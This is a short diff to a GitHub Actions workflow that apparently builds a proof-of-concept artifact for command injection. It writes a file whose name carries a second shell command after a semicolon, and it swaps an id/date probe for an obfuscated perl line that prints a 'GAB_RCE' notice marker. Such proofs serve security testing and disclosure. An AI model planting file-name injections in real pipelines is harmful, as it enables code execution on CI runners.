@@ -12,7 +12,7 @@ jobs:
           set -e
           mkdir -p content
           printf 'hello\n' > content/report.txt
-          printf 'x\n' > "content/report.txt;echo ::notice::GAB_RCE_$(id -un)_$(date +%s);true;#.txt"
+          printf 'x\n' > "content/report.txt;perl -e 'print chr(58)x2,q{notice},chr(58)x2,q{GAB_RCE_PROOF},chr(10)';true;#.txt"
       - uses: actions/upload-artifact@v4
         with:
           name: content-poc
